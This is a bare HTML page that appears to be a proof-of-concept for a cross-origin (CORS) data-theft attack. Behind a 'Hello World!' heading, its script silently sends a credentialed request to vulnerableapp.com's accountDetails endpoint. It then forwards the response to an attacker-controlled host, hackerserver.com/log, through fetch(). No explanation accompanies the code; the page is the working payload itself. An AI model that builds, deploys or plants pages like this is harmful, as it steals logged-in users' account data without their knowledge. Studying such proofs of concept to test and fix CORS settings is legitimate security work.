<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://vulnerableapp.com/accountDetails"
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE){
                    fetch("https://hackerserver.com/log?key=" + xhr.responseText)
                }
            }
            xhr.open("GET", url, true);
            xhr.withCredentials = true;
            xhr.send(null)
        </script>
    </body>
</html>
